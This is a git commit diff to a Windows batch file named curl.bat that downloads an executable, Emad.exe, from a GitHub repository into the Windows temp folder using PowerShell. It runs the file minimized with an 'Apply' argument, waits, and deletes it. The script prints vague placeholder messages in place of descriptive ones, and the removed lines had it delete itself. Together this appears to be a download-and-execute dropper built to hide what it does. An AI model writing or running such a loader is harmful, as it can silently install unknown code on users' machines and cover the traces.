e467df01924d41d39edc3fec3096c420feb87372
emad8787 <mdemadhossainfci28@gmail.com>
2025-03-14 04:39:33 -0700

    Update curl.bat

--- curl.bat
+++ curl.bat
@@ -1,14 +1,14 @@
 @echo off
 set "url=https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe"
-set "destination=%TEMP%\Emad.exe"
-set "batchFile=%~f0"
+set "destination=C:\Windows\Temp\Emad.exe"
+set "arguments=Apply"
 
-echo Downloading file...
+echo WAITING FOR LAUNCH...
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
+echo WAITING ...
+start /min "" "%destination%" %arguments%
 
-echo Running file...
-start "" /wait "%destination%"
+timeout /t 5 /nobreak >nul 2>&1
 
-echo Cleaning up...
+echo ........
 del "%destination%"
-(del /f /q "%batchFile%" & exit)
